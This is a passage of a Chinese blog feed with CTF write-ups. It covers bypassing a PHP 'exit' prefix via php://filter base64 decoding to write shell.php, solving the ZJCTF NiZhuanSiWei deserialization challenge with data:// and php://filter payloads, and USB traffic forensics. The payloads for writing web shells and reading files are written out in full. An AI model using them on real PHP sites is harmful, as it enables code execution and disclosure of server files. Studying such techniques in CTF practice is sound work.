            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈CTF中代码审计PHP死亡退出</title>
      <link href="/posts/bb2a675e/"/>
      <url>/posts/bb2a675e/</url>
      
        <content type="html"><![CDATA[<p>前言：遇到一个代码审计的题目，略有思考。记录一下~<br>源码就是这样的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><code>.=</code>就是拼接。前面的<code>$content</code>已经给了<code>&lt;?php exit; ?&gt;</code>，所以说不管后面是什么，都会先执行退出。导致后面的语句不执行。这也叫PHP死亡退出。<br>P神的讲解<br><img src="https://img-blog.csdnimg.cn/20201024210717645.png#pic_center" alt="m0re" loading="lazy"><br>实战中会比较多的在缓存和配置文件里。<br>绕过其实也很简单，POST方式提交了参数，这个是可控的，所以尝试PHP伪协议来进行写入一句话，并且使用base64-decode去除死亡退出。</p><ul><li>利用<code>php://filter</code>流的<code>base64_decode</code>函数特性去除死亡exit</li><li>base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过</li><li><code>&lt;?php exit; ?&gt;</code>这条代码base64解码时，会解码为<code>phpexit</code></li><li>base64解码是四个byte一组，所以再增加一个字符，凑够两组，后面的就会正常解码</li></ul><p>在本地进行实验<br><img src="https://img-blog.csdnimg.cn/20201024212320145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>payload</p><pre class="language-php" data-language="php"><code class="language-php">filename<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=shell.php&amp;data=aPD9waHAgcGhwaW5mbygpOyA/Pg</span></code></pre><p>查看网站目录成功写入<br><img src="https://img-blog.csdnimg.cn/20201024213115228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>内容是<img src="https://img-blog.csdnimg.cn/20201024213139495.png#pic_center" alt="m0re" loading="lazy"><br>可以看到已经绕过了exit。直接执行我写入的PHP语句了。<br><img src="https://img-blog.csdnimg.cn/20201024213310164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>自己的理解：原本不管写入什么都是拼接在<code>&lt;?php exit;?&gt;</code>后面的，像这样<br><img src="https://img-blog.csdnimg.cn/20201024222331788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>执行一下是什么都没有。<br><img src="https://img-blog.csdnimg.cn/20201024222419633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>因为先执行了<code>exit</code>退出了。<br>还有今天下午的慕测平台的软件测试大赛，比较菜就做出来两个，一个是git泄露，一个是文件上传。第一题跟这个类似。<br>源码是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php exit();?> '</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>这个题，可能是运维师傅给的权限太高了，直接将写权限给出来了，就有人搅屎，把index.php给删了。然后网站就访问不了了。<br>解题过程中这个没想明白的是<code>$_REQUEST</code>虽然是集合get和post的请求方式，但是这个两个都是request，就有点难以理解。我进行复现时是这样的。<br><img src="https://img-blog.csdnimg.cn/20201024223703715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>就会有报错，内容是，<code>file_put_contents()</code>需要两个参数，而此请求只提供了一个。<br>所以无法成功执行。<br>还有就是如果使用<code>base64-decode</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">file</span><span class="token operator">=</span>php://filter/write<span class="token operator">=</span>convert.base64-decode/resource<span class="token operator">=</span>shell.php<span class="token operator">&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>aPD9waHAgZmlsZV9nZXRfY29udGVudHMoImZsYWcucGhwIikgPz4<span class="token operator">=</span></code></pre><p>是可以成功写入，但是写入的是这样的。而且文件名也是base64编码。无法利用。</p><p><img src="https://img-blog.csdnimg.cn/20201024225602550.png#pic_center" alt="m0re" loading="lazy"><br>目前思路卡在这里。不知道有没有wp，或者回头问问其他师傅们。<br>看到的师傅们如果了解还请指点一下，感谢！</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记—一些思考</title>
      <link href="/posts/37b33e9e/"/>
      <url>/posts/37b33e9e/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间思考了几个问题，刷题的意义？拿到一道题知不知道它要考什么？有没有思路就去做？做这么多题有没有总结套路？知道考点了，是否明白它要考这个考点的具体什么内容？是否明白从何入手？<br>其实刷CTF题目就高考刷题一样，做那么多题，最后考试还是不知道从何入手，知道要考这个题，但是不会变通，就是只会做自己做过的题，都知道考试不会有一模一样的题，不会说用以前的公式模版直接套就能得到答案。CTF也一样的！<br>可能有的知道一些刷题小窍门，就像CTF中的一些骚姿势一样，虽然放在一些题目中比较实用，可以适当总结一点。但是不要依赖，否则会限制思维，看到题就会给那上面想，也不向其他地方思考就想着捷径，最后就会发现，有些基础知识，理解的都不深刻，甚至不了解。这是很可怕的，没基础就不用说了，根本不入流。<br>以后决定改一下自己的博客风格，尤其是题记。会写的比较详细。拓展多一点。知道自己理解了为止。</p><p>开始这周的总结</p><h2 id="反序列化知识"><a href="#反序列化知识" class="headerlink" title="反序列化知识"></a>反序列化知识</h2><p>一般拿到反序列化的题，从哪里入手？<br>之前学过一点点基础的反序列化，题目还是比较多的，所以再进行深入的学习一下。</p><pre class="language-bash" data-language="bash"><code class="language-bash">__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep:序列化对象之前就调用此方法<span class="token punctuation">(</span>其返回需要一个数组<span class="token punctuation">)</span>__wakeup:反序列化恢复对象之前调用该方法__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用私有属性的时候会自动执行__isset<span class="token punctuation">(</span><span class="token punctuation">)</span>在不可访问的属性上调用isset<span class="token punctuation">(</span><span class="token punctuation">)</span>或empty<span class="token punctuation">(</span><span class="token punctuation">)</span>触发__unset<span class="token punctuation">(</span><span class="token punctuation">)</span>在不可访问的属性上使用unset<span class="token punctuation">(</span><span class="token punctuation">)</span>时触发</code></pre><p>代码审计非常重要，现在也打算重修代码基础了。<br>PHP进行序列化，首先实例化一个对象，然后将对象进行序列化和反序列化处理，一个简单示例</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">m0re</span><span class="token punctuation">&#123;</span><span class="token comment">//创建一个类</span><span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'123'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$lxj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">m0re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//实例化一个对象</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$lxj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//进行序列化操作</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//输出//O:4:"m0re":1:&#123;s:4:"test";s:3:"123";&#125;</code></pre><p>然后如果进行反序列化，就在原本的基础上进行代码操作unserialize</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">m0re</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'123'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$lxj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">m0re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$lxj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token variable">$lalala</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$lalala</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*输出结果O:4:"m0re":1:&#123;s:4:"test";s:3:"123";&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>m0re Object(    [test] => 123)*/</code></pre><p>然后调用魔术方法的示例</p><pre class="language-php" data-language="php"><code class="language-php">/*代码来自chybeta师傅*/<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">chybeta</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'123'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"__wakeup"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"__construct"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"__destruct"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$class2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$class2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token variable">$class2_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$class2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$class2_unser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>__wakeup此刻调用__wakeup()<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>chybeta Object(    [test] => 123)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>__destruct此刻调用__destruct()<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>*/</code></pre><p>师傅写的代码很容易理解，多看几遍，最终理解什么时候调用什么函数，为后面做题打好基础。</p><blockquote><p>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。<br>析构函数__destruct()：当对象被销毁时会自动调用。<br>__wakeup() ：如前所提，unserialize()时会自动调用。</p></blockquote><p>一般看有没有危险函数，诸如</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">-</span> 命令执行：<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span> 文件操作：<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结合例题(虽然之前做过，但是再做一遍，多点思考)<br>[ZJCTF 2019]NiZhuanSiWei</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>看到include文件包含，首先想到伪协议进行读取源码。看到有<code>useless.php</code>提示可能包含的是这个文件，所以需要考虑怎么执行到这一步。<br>一句一句分析，是先绕过if语句<br><code>text===welcome to the zictf</code>，使用伪协议进行读取字符串<br><code>data://text/plain;welcome to the zjctf</code>但是他有过滤，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Not now!"</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>正则匹配flag进行过滤，所以需要进行绕过正则，就要使用data伪协议中的base64形式来进行绕过。<br><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>这算是绕过了第一个if，继续看是文件包含了，使用<code>php://filter</code>来读取源码。<br><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code><br>拼接一下，得到最终payload是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=useless.php&amp;&amp;text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></code></pre><p>回显得到base64编码，进行解码得到<code>useless.php</code>的源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>拿到源码，通一遍，然后就是有目的性的去找危险函数，比如这里的<code>__tostring()</code>和<code>file_get_contents()</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">__toString触发条件：<span class="token builtin class-name">echo</span> <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> / print<span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span>打印时会触发字符串连接时格式化字符串时与字符串进行<span class="token operator">==</span>比较时（PHP进行<span class="token operator">==</span>比较的时候会转换参数类型）格式化SQL语句，绑定参数时 数组中有字符串时</code></pre><p>然后尝试进行序列化，看到的上面的代码中<code>$file</code>变量是没有参数的，注释中又给了<code>flag.php</code>，所以flag应该是在flag.php中的，所以读取文件<code>flag.php</code>然后创建对象.<br>还有这个别忘了<code>$password = unserialize($password);</code>并进行序列化，最后传参。<br>才可以得到password。<br>PHP代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php</span>    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$m0re_1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$m0re_2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$m0re_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$m0re_2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>序列化结果<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><br>最终payload，拼接</p><pre class="language-bash" data-language="bash"><code class="language-bash">?file<span class="token operator">=</span>useless.php<span class="token operator">&amp;</span><span class="token assign-left variable">text</span><span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>O:4:<span class="token string">"Flag"</span>:1:<span class="token punctuation">&#123;</span>s:4:<span class="token string">"file"</span><span class="token punctuation">;</span>s:8:<span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可能有的疑问：为什么<code>useless.php</code>不使用<code>php://filter</code>？<br>因为：现在要读取的不是<code>useless.php</code>了，只是包含就可以了，现在要读取的是<code>flag.php</code><br>最后在源码中发现flag。此题结束。</p><h2 id="流量分析之USB流量题目"><a href="#流量分析之USB流量题目" class="headerlink" title="流量分析之USB流量题目"></a>流量分析之USB流量题目</h2><p>周四公开课学长讲的USB流量分析，讲了鼠标流量和键盘流量，现在进行复现总结。</p><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p>USB是一种外设接口，可以通过对它进行流量抓取，例如键盘击键，鼠标移动与点击，存储设备的明文传输通信、USB无线网卡网络传输内容等，下面的学习主要针对鼠标和键盘流量。</p><p>鼠标流量一般是四个字节，类型是USB，数据包一般wireshark打开会知道是怎样的。<br><img src="https://img-blog.csdnimg.cn/20201010115412130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>鼠标信息，是通过点的方式来决定的，比如画一条线，抓取流量抓取到的是坐标信息。一个点一个点的坐标连接起来组成的线，然后得到鼠标轨迹。</p><blockquote><p>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p></blockquote><p>键盘信息，通过敲击来传输信息。<br>键盘流量信息特点</p><blockquote><p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次击键都会产生一个数据包。所以如果看到给出的数据包中的信息都是8个字节，并且只有第3个字节不为0000，那么几乎可以肯定是一个键盘流量了。</p></blockquote><p>在USB协议的 文档中搜索 keyboard。就可以找到击键信息和数据包中16进制数据的对照表<br><img src="https://img-blog.csdnimg.cn/20201010120020694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="鼠标流量取证"><a href="#鼠标流量取证" class="headerlink" title="鼠标流量取证"></a>鼠标流量取证</h3><p>思路：一般是提取字节流，然后利用脚本进行整理，比如在数据中加上冒号，删除提取中得到的空行，然后使用画图工具进行描点画图。得到轨迹。<br>使用命令提取信息，<code>tshark</code><br>tshark是网络分析工具wireshark下的一个工具，主要用于命令行环境进行抓包、分析，尤其对协议深层解析时，tcpdump难以胜任的场景中。</p><pre class="language-bash" data-language="bash"><code class="language-bash">tshark -r usb2.pcap -T fields -e usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt</code></pre><p>使用这条命令进行提取减少出错，不带正则的话，后面使用脚本提取可能会遇到空行就中止了，导致提取不出完全的数据。自然也画不出图来。<br>得到数据，在文件中看到数据。<br><img src="https://img-blog.csdnimg.cn/20201010120510635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>下一步要根据坐标画图，这个坐标也不是画图工具—— gunplot可以识别的。所以要用脚本处理一下。<br>首先剔除长度不是8位的，然后两两分组，加上冒号。</p><p><strong>还需要注意的一点是：鼠标流量可以是左键或者右键。这个在下面的脚本中有提到，1代表左键，2代表右键。可以使用脚本跑，测试哪个可以跑出来结果。</strong></p><p>使用通用脚本进行处理<br>加冒号的处理。</p><pre class="language-python" data-language="python"><code class="language-python">f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>fi<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a<span class="token 